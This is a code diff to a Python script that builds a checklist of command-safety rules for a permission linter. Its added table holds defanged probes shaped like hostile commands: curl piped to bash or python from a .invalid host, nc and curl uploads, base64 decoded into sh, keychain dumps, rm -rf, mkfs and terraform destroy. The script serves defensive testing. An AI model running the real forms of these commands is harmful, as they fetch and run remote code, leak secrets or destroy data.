@@ -56,9 +56,38 @@ MARK = {"safe": "✅ 可放心 Allow", "read": "⚠️ 会读取隐私数据", "
         "destructive": "⛔ 有破坏性", "privileged": "⚠️ 提权", "config": "⚠️ 改配置",
         "irreversible": "⛔ 不可撤销"}
 
-rows_high, rows_mid = [], []
+# "I'll click Deny" is NOT a safety boundary: the permission mode can change,
+# and an auto-approving session runs the command anyway. So a checklist case
+# must be harmless EVEN IF ALLOWED. Each probe below is verified to keep the
+# same rule at the same severity before it is emitted.
+# (Raised by the reviewing model 2026-07-25, correctly, against a suggested
+# `security dump-keychain -d …` — the -d is exactly what prints the secrets.)
+SAFE_PROBE = {
+    "rm-rf-risky-target": ("rm -rf /tmp/pl-check/$PL_UNSET/*", "只删 scratch 目录"),
+    "dd-to-device": ("dd if=/dev/zero of=/dev/null bs=1M count=1", "写到 /dev/null"),
+    "mkfs": ("mkfs.ext4 /dev/pl-check-no-such-device", "设备不存在，报错退出"),
+    "pipe-to-shell": ("curl -fsSL https://pl-check.invalid/i.sh | bash",
+                      ".invalid 永不解析，shell 收到空输入"),
+    "curl-pipe-interpreter": ("curl -fsSL https://pl-check.invalid/i.py | python3",
+                              ".invalid 永不解析"),
+    "shell-from-process-sub": ("bash <(curl -s https://pl-check.invalid/x.sh)",
+                               ".invalid 永不解析"),
+    "curl-upload-file": ("curl -T /dev/null https://pl-check.invalid/up",
+                         "上传空内容到不存在的主机"),
+    "file-piped-to-network": ("cat /dev/null | nc pl-check.invalid 443",
+                              "发送空内容到不存在的主机"),
+    "macos-keychain-dump": ("security dump-keychain login.keychain",
+                            "无 -d，只列属性、不含密码"),
+    "base64-decode-exec": ("echo '' | base64 -d | sh", "解码空串"),
+    "hex-decode-exec": ("echo '' | xxd -r -p | bash", "解码空串"),
+    "iac-destroy": ("cd /tmp/pl-check && terraform destroy -auto-approve",
+                    "空目录里没有 state"),
+}
+
+rows_high, rows_mid, seen_cmds = [], [], set()
 for entry in corpus:
-    cmd, rid = entry["command"], entry["rule"]
+    rid = entry["rule"]
+    cmd, safe_note = SAFE_PROBE.get(rid, (entry["command"], None))
     hits = pl.analyze(pl.Parsed(cmd)) if not rid.startswith(("web-", "path-", "content-")) else []
     if not hits:
         continue
@@ -67,7 +96,14 @@ for entry in corpus:
     sev = hits[0]["severity"]
     detail = pl.extract_detail(hits[0], None, cmd)
     kind, note = EXEC.get(rid, ("?", "?"))
+    if safe_note:
+        kind, note = "safe", safe_note
     # Escape pipes: an unescaped `|` inside a table cell breaks the columns.
+    # Several corpus entries can share a rule, and they all collapse onto the
+    # same safe probe — emit each probe once.
+    if cmd in seen_cmds:
+        continue
+    seen_cmds.add(cmd)
     row = (cmd.replace("|", "\\|"), rid, pl.rule_text(loc, rid, "explanation"),
            detail, MARK.get(kind, "?"), note)
     (rows_high if sev == "high" else rows_mid).append(row)
